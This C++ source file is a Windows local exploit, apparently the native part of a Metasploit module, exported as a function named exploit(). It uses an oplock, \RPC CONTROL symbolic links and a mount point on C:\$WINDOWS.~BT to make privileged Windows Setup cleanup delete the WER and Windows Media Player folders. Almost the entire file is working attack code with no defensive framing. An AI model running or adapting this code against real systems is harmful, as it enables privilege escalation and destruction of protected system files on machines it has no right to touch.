#include "stdafx.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include <iostream>
#include <conio.h>
#include <ctime>
#include <wchar.h>
#include <io.h>
#include <string.h>
#include <stdio.h>
#include <random>
#include <AclAPI.h>
#include "ntimports.h"
#include "CommonUtils.h"
#include "resource.h"

#pragma warning(disable : 4996) //silence some compiler warning
#define FULL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
using std::wstring;
using std::string;
HANDLE wer;
HANDLE lnk;
HANDLE lnk2;
HANDLE file;
HANDLE wmp;
HANDLE hdir;
string dir;
string filename;
HANDLE proc;
bool MoveByHandle(HANDLE hfile, const wchar_t* Renamed) {
	auto destFilenameLength = wcslen(Renamed);
	auto bufferSize = sizeof(FILE_RENAME_INFO) + (destFilenameLength * sizeof(wchar_t));
	auto buffer = _malloca(bufferSize);
	memset(buffer, 0, bufferSize);
	auto const fri = reinterpret_cast<FILE_RENAME_INFO*>(buffer);
	fri->ReplaceIfExists = TRUE;
	fri->FileNameLength = (DWORD)destFilenameLength;
	wmemcpy(fri->FileName, Renamed, destFilenameLength);
	if (!SetFileInformationByHandle(hfile, FileRenameInfo, fri, (DWORD)bufferSize))
	{
		return 0;
	}
	else
		return 1;
}
void remove_dir(const wchar_t* folder)
{
	std::wstring search_path = std::wstring(folder) + _T("/*.*");
	std::wstring s_p = std::wstring(folder) + _T("/");
	WIN32_FIND_DATAW fd;
	HANDLE hFind = ::FindFirstFileW(search_path.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (wcscmp(fd.cFileName, _T(".")) != 0 && wcscmp(fd.cFileName, _T("..")) != 0)
				{
					remove_dir((wchar_t*)(s_p + fd.cFileName).c_str());
				}
			}
			else {
				DeleteFile((s_p + fd.cFileName).c_str());
			}
		} while (::FindNextFileW(hFind, &fd));
		::FindClose(hFind);
		_wrmdir(folder);
	}
}
HANDLE CreateSymlink(HANDLE root, LPCWSTR linkname, LPCWSTR targetname)
{
	DEFINE_NTDLL(RtlInitUnicodeString);
	DEFINE_NTDLL(NtCreateSymbolicLinkObject);

	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING name;
	UNICODE_STRING target;

	fRtlInitUnicodeString(&name, linkname);
	fRtlInitUnicodeString(&target, targetname);

	InitializeObjectAttributes(&objAttr, &name, OBJ_CASE_INSENSITIVE, root, nullptr);

	HANDLE hLink;

	NTSTATUS status = fNtCreateSymbolicLinkObject(&hLink,
		SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &target);
	if (status == 0)
	{
		return hLink;
	}
	else
	{
		SetLastError(NtStatusToDosError(status));
		return nullptr;
	}
}
BOOL makedir(string dir) {
	//this function will create a directory that allow everyone to have full access on it
	//due to the default ACL in c:\windows\temp which doesn't allow a standard user to have
	//a read access to the subcontent
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	PSID everyone_sid = NULL;
	AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0, &everyone_sid);
	EXPLICIT_ACCESS ea;
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;//full access to everyone
	ea.grfAccessMode = SET_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea.Trustee.ptstrName = (LPWSTR)everyone_sid;//everyone sid
	PACL acl = NULL;
	SetEntriesInAcl(1, &ea, NULL, &acl);
	PSECURITY_DESCRIPTOR sd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
		SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(sd, TRUE, acl, FALSE);
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = sd;
	sa.bInheritHandle = FALSE;

	return CreateDirectoryA(dir.c_str(), &sa);

}

void wercb() {
	/// move both directories wer and wmp in c:\windows\temp\asm*.tmp
	/// it's needed in order to wipe C:\\$WINDOWS.~BT
	/// so we can set a reparse point
	wchar_t pp[MAX_PATH];
	GetTempFileName(L"C:\\Windows\\Temp", L"asm", NULL, pp);
	if (!MoveByHandle(wer, pp)) {
		ExitProcess(EXIT_FAILURE);
	}
	wchar_t pp2[MAX_PATH];
	GetTempFileName(L"C:\\Windows\\Temp", L"asm", NULL, pp2);
	if (!MoveByHandle(wmp, pp2)) {
		ExitProcess(EXIT_FAILURE);
	}
	lnk = CreateSymlink(NULL, L"\\RPC CONTROL\\WER", L"\\??\\C:\\ProgramData\\Microsoft\\Windows\\WER");
	if (lnk == INVALID_HANDLE_VALUE) {
		ExitProcess(EXIT_FAILURE);
	}
	lnk2 = CreateSymlink(NULL, L"\\RPC CONTROL\\wmp", L"\\??\\C:\\Program Files\\Windows Media Player");
	if (lnk2 == INVALID_HANDLE_VALUE) {
		ExitProcess(EXIT_FAILURE);
	}
	hdir = CreateFileA("C:\\$WINDOWS.~BT", GENERIC_WRITE,
		FULL_SHARING
		, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (!ReparsePoint::CreateMountPoint(hdir, L"\\RPC CONTROL\\", L"")) {
		ExitProcess(EXIT_FAILURE);
	}
}

void WaitServiceToExit() {
	SC_HANDLE svc = OpenService(OpenSCManager(NULL, NULL, GENERIC_READ), L"WMPNetworkSvc", SERVICE_QUERY_STATUS);
	SERVICE_STATUS status;
	QueryServiceStatus(svc, &status);
	bool once = true;
	while (status.dwCurrentState != SERVICE_STOPPED) {
		if (once) {
			once = false;
		}
		Sleep(500);//to avoid huge cpu usage
		QueryServiceStatus(svc, &status);
	}
}

extern "C" int exploit() {

	WaitServiceToExit();
	//just to make sure
	ReparsePoint::DeleteMountPoint(L"C:\\$WINDOWS.~BT");
	remove_dir(L"C:\\$WINDOWS.~BT");
	DeleteFile(L"C:\\$WINDOWS.~BT");
	//it's not really required to use this function
	//am just lazy to change to Create directory
	//am using an existing project so whenever
	makedir("C:\\$WINDOWS.~BT");
	makedir("C:\\$WINDOWS.~BT\\wmp");
	makedir("C:\\$WINDOWS.~BT\\WER");

	wer = CreateFileA("C:\\$WINDOWS.~BT\\WER",GENERIC_READ|DELETE,
		NULL//no sharing
		, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	wmp = CreateFileA("C:\\$WINDOWS.~BT\\wmp", GENERIC_READ | DELETE,
		NULL
		, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	
	FileOpLock* lock = FileOpLock::CreateLock(wer, wercb);
	if (lock != nullptr) {
		// Wait for oplock to trigger, however long it may take.
		lock->WaitForLock(INFINITE);
	}
	else {
		return 1;
	}
	//wait sometime until the windows setup end file deletion
	//you might need to expand this if there's to much files in C:\\ProgramData\\Microsoft\\Windows\\WER
	Sleep(10000);
	CloseHandle(lnk);
	CloseHandle(lnk2);

	// We will do the rest in Metasploit.
	return 0;
}